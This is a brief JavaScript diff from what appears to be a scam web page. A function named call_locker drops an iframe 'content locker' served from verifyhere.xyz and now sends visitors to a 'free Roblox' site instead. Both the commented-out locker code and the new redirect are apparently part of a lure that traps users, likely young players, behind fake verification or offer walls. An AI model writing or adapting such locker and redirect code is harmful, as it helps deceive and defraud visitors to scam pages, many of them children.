@@ -209,11 +209,13 @@ function S1() {
 
 function call_locker() {
   // Show the loader
-  document.getElementById("iframe-overlay").innerHTML =
-    '<iframe id="lockeriframe" src="https://verifyhere.xyz/cl/i/5k8dm1" frameborder="0" class="second-row"></iframe>';
+  // document.getElementById("iframe-overlay").innerHTML =
+  //   '<iframe id="lockeriframe" src="https://verifyhere.xyz/cl/i/5k8dm1" frameborder="0" class="second-row"></iframe>';
 
-  // Insert the iframe after a delay to simulate loading time
-  setTimeout(function () {
-    document.getElementById("iframe-overlay").style.display = "flex"; // Show iframe overlay
-  }, 100);
+  // // Insert the iframe after a delay to simulate loading time
+  // setTimeout(function () {
+  //   document.getElementById("iframe-overlay").style.display = "flex"; // Show iframe overlay
+  // }, 100);
+
+  window.location.href="https://freerobloxintermediate.onrender.com";
 }
